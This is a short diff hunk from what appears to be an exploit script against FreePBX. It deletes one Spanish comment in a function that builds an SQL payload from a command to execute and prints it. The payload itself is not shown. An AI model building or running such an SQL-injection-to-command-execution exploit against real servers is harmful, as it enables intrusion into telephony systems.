@@ -38,7 +38,7 @@ def exploit_freepbx_breaker(ip: str, port: str, token: str = None):
     print(f"Command Payload: {COMMAND_TO_EXECUTE}")
     print("="*60)
 
-    # 1. Construcción del Payload
+    
     sql_payload = build_sql_payload(COMMAND_TO_EXECUTE)
     print(f"[+] Constructed SQL payload: {sql_payload}")
 
